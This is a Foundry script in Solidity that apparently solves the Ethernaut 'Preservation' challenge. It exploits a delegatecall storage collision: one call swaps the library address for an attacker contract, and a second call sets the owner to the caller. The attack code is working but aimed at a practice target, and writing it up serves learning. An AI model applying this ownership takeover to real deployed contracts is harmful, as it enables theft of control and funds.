// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import { Script } from "forge-std/script.sol";

import { Preservation } from "src/Preservation/Preservation.sol";
import { PreservationAttack } from "src/Preservation/PreservationAttack.sol";

contract PreservationAttackScript is Script {
    address preservationInstance = address(0x71444CbecD2CE0f74773Dc98Bd527518575eC7F1);

    function run() public {
        vm.startBroadcast();
        PreservationAttack attacker = new PreservationAttack();

        // use the delegatecall to rewrite the first state slot with our attacker address
        Preservation(preservationInstance).setFirstTime(uint256(uint160(address(attacker))));
        assert(Preservation(preservationInstance).timeZone1Library() == address(attacker));

        // now that our attacker contract is set, the next delegatecall will allow us to rewrite state variables
        Preservation(preservationInstance).setFirstTime(uint256(uint160(msg.sender)));
        assert(Preservation(preservationInstance).owner() == msg.sender);
        vm.stopBroadcast();
    }
}
